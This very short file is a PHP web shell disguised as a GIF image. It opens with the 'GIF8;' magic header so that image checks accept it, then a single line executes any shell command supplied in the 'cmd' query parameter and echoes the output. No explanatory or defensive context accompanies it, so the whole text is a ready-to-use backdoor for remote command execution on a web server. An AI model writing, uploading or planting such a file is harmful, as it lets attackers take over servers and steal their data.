GIF8;
<?php echo '<pre>'.shell_exec($_GET['cmd']); ?>